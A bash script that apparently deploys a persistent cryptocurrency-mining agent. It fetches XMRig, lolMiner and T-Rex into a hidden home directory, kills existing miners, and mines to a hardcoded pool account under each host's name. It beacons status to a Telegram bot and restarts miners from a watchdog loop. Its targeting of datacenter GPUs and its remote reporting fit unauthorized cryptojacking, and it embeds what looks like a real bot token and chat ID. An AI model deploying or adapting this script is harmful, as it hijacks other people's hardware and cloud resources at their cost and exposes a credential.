#!/bin/bash
###############################################################################
# MINING AGENT — FIXED TELEGRAM + RELIABLE INSTALLATION
# CPU: XMR (XMRig) | GPU: ETC (lolMiner/T-Rex)
###############################################################################
set -o pipefail

# ===== CONFIG =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOST="$(hostname)"
BASE="$HOME/.mining"
BIN_CPU="$BASE/bin/cpu"
BIN_GPU="$BASE/bin/gpu"
RUN="$BASE/run"
LOG="$BASE/log"

KRIPTEX_USER="krxX3PVQVR"
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# FIXED TELEGRAM CONFIG (NO SPACES!)
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# SOURCES (with fallbacks)
XMRIG_URLS=(
  "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-x64.tar.gz"
  "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
)
LOLMINER_URLS=(
  "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
  "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"
)
TREX_URLS=(
  "https://github.com/trexminer/T-Rex/releases/download/0.30.1/t-rex-0.30.1-linux.tar.gz"
  "https://github.com/trexminer/T-Rex/releases/download/0.29.3/t-rex-0.29.3-linux.tar.gz"
)

CHECK_INTERVAL=30
MIN_GPU_HASHRATE=1  # MH/s minimum

# ===== PREPARE =====
mkdir -p "$BIN_CPU" "$BIN_GPU" "$RUN" "$LOG"
chmod 700 "$BASE" "$BIN_CPU" "$BIN_GPU" "$RUN" "$LOG" 2>/dev/null

# ===== TELEGRAM (FIXED) =====
tg_send() {
  local msg="$1"
  # Clean HTML formatting (no **bold**, only <b>bold</b>)
  local clean_msg=$(echo "$msg" | sed 's/\*\*\([^*]*\)\*\*/<b>\1<\/b>/g')
  
  for _ in {1..5}; do
    curl -fsS --connect-timeout 10 \
      -X POST "$TG_API" \
      -H "Content-Type: application/json" \
      -d "{\"chat_id\":\"$TG_CHAT\",\"text\":\"$clean_msg\",\"parse_mode\":\"HTML\"}" \
      >/dev/null 2>&1 && return 0
    sleep 5
  done
  echo "❌ Failed to send Telegram message" >> "$LOG/agent.log"
  return 1
}

# ===== NETWORK WAIT (AGGRESSIVE) =====
echo "=== Network wait started at $(date) ===" >> "$LOG/agent.log"
for i in {1..30}; do
  if curl -fsS --connect-timeout 5 https://api.telegram.org >/dev/null 2>&1; then
    tg_send "📶 <b>[$HOST] Network ready</b>"
    break
  fi
  sleep 2
done

# ===== DEPENDENCIES CHECK =====
check_deps() {
  local missing=""
  for cmd in curl wget tar gzip ps pgrep; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      missing="$missing $cmd"
    fi
  done
  
  if [ -n "$missing" ]; then
    tg_send "⚠️ <b>[$HOST] Missing dependencies:</b>$missing"
    # Try to install on Debian/Ubuntu
    if command -v apt-get >/dev/null 2>&1; then
      tg_send "🔧 <b>[$HOST] Installing dependencies...</b>"
      sudo apt-get update >/dev/null 2>&1
      sudo apt-get install -y curl wget tar gzip procps >/dev/null 2>&1
    fi
  fi
}
check_deps

# ===== CLEAN OLD STATE =====
pkill -f xmrig 2>/dev/null || true
pkill -f lolMiner 2>/dev/null || true
pkill -f t-rex 2>/dev/null || true
rm -rf "$BIN_CPU"/* "$BIN_GPU"/* 2>/dev/null
tg_send "🧹 <b>[$HOST] Cleaned old processes and binaries</b>"

# ===== INSTALL XMRIG (WITH FALLBACKS) =====
install_xmrig() {
  tg_send "⬇️ <b>[$HOST] Installing XMRig (CPU miner)...</b>"
  
  for url in "${XMRIG_URLS[@]}"; do
    if wget -q "$url" -O /tmp/xmrig.tgz; then
      mkdir -p /tmp/xmrig
      tar -xzf /tmp/xmrig.tgz -C /tmp/xmrig --strip-components=1 || continue
      cp /tmp/xmrig/xmrig "$BIN_CPU/" 2>/dev/null || cp /tmp/xmrig/* "$BIN_CPU/" 2>/dev/null
      chmod +x "$BIN_CPU/xmrig" || continue
      rm -rf /tmp/xmrig /tmp/xmrig.tgz
      tg_send "✅ <b>[$HOST] XMRig installed successfully</b>"
      return 0
    fi
  done
  
  tg_send "❌ <b>[$HOST] XMRig installation failed</b>"
  return 1
}
install_xmrig

# ===== INSTALL GPU MINERS (MULTI-MINER) =====
install_gpu_miners() {
  tg_send "⬇️ <b>[$HOST] Installing GPU miners...</b>"
  
  # lolMiner
  for url in "${LOLMINER_URLS[@]}"; do
    if wget -q "$url" -O /tmp/lol.tgz; then
      mkdir -p /tmp/lol
      tar -xzf /tmp/lol.tgz -C /tmp/lol || continue
      cp /tmp/lol/1.98/lolMiner "$BIN_GPU/" 2>/dev/null || cp /tmp/lol/lolMiner "$BIN_GPU/" 2>/dev/null
      chmod +x "$BIN_GPU/lolMiner" || continue
      tg_send "✅ <b>[$HOST] lolMiner installed</b>"
      break
    fi
  done
  
  # T-Rex (for modern NVIDIA GPUs)
  for url in "${TREX_URLS[@]}"; do
    if wget -q "$url" -O /tmp/trex.tgz; then
      mkdir -p /tmp/trex
      tar -xzf /tmp/trex.tgz -C /tmp/trex || continue
      cp /tmp/trex/t-rex "$BIN_GPU/" || continue
      chmod +x "$BIN_GPU/t-rex" || continue
      tg_send "✅ <b>[$HOST] T-Rex miner installed (for NVIDIA A40/L4/A6000)</b>"
      break
    fi
  done
  
  # Check if at least one GPU miner installed
  if [ ! -x "$BIN_GPU/lolMiner" ] && [ ! -x "$BIN_GPU/t-rex" ]; then
    tg_send "❌ <b>[$HOST] No GPU miners installed</b>"
  fi
}
install_gpu_miners

# ===== START MINERS =====
start_cpu() {
  tg_send "🚀 <b>[$HOST] Starting CPU miner (XMR)...</b>"
  
  "$BIN_CPU/xmrig" \
    -o "$XMR_POOL" \
    -u "${KRIPTEX_USER}.${HOST}" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    --background --log-file="$LOG/cpu.log" \
    >/dev/null 2>&1 &
    
  sleep 5
  if pgrep -f xmrig >/dev/null; then
    tg_send "✅ <b>[$HOST] CPU miner started successfully</b>"
    return 0
  else
    tg_send "❌ <b>[$HOST] CPU miner failed to start</b>"
    return 1
  fi
}

start_gpu() {
  # Check if GPU exists
  if ! (lspci 2>/dev/null | grep -qiE "nvidia|amd") && \
     ! (command -v nvidia-smi >/dev/null 2>&1); then
    tg_send "⚠️ <b>[$HOST] No GPU detected - GPU mining disabled</b>"
    return 0
  fi
  
  tg_send "🚀 <b>[$HOST] Starting GPU miner (ETC)...</b>"
  
  # Try T-Rex first for modern NVIDIA GPUs
  if [ -x "$BIN_GPU/t-rex" ]; then
    "$BIN_GPU/t-rex" \
      -a etchash \
      -o stratum+tcp://"$ETC_POOL" \
      -u "${KRIPTEX_USER}.${HOST}" \
      -p x \
      --api-bind-http 127.0.0.1:4068 \
      --no-watchdog \
      >>"$LOG/gpu.log" 2>&1 &
      
    sleep 10
    if pgrep -f t-rex >/dev/null; then
      tg_send "✅ <b>[$HOST] GPU miner started with T-Rex</b>"
      return 0
    fi
    tg_send "⚠️ <b>[$HOST] T-Rex failed, trying lolMiner...</b>"
  fi
  
  # Fallback to lolMiner
  if [ -x "$BIN_GPU/lolMiner" ]; then
    "$BIN_GPU/lolMiner" \
      --algo ETCHASH \
      --pool "$ETC_POOL" \
      --user "${KRIPTEX_USER}.${HOST}" \
      --apihost 127.0.0.1 \
      --apiport 8080 \
      --disablewatchdog \
      >>"$LOG/gpu.log" 2>&1 &
      
    sleep 10
    if pgrep -f lolMiner >/dev/null; then
      tg_send "✅ <b>[$HOST] GPU miner started with lolMiner</b>"
      return 0
    fi
  fi
  
  tg_send "❌ <b>[$HOST] GPU miner failed to start</b>"
  return 1
}

# Start miners
start_cpu
start_gpu

tg_send "✅ <b>[$HOST] Mining agent fully operational</b>"

# ===== WATCHDOG LOOP =====
watchdog() {
  while true; do
    # CPU miner check
    if ! pgrep -f xmrig >/dev/null; then
      tg_send "⚠️ <b>[$HOST] CPU miner crashed - restarting</b>"
      start_cpu
    fi
    
    # GPU miner check (if GPU exists)
    if (lspci 2>/dev/null | grep -qiE "nvidia|amd") || (command -v nvidia-smi >/dev/null 2>&1); then
      if ! pgrep -f "lolMiner\|t-rex" >/dev/null; then
        tg_send "⚠️ <b>[$HOST] GPU miner crashed - restarting</b>"
        start_gpu
      fi
    fi
    
    sleep "$CHECK_INTERVAL"
  done
}

# Start watchdog in background
watchdog &

# Keep main process alive
wait
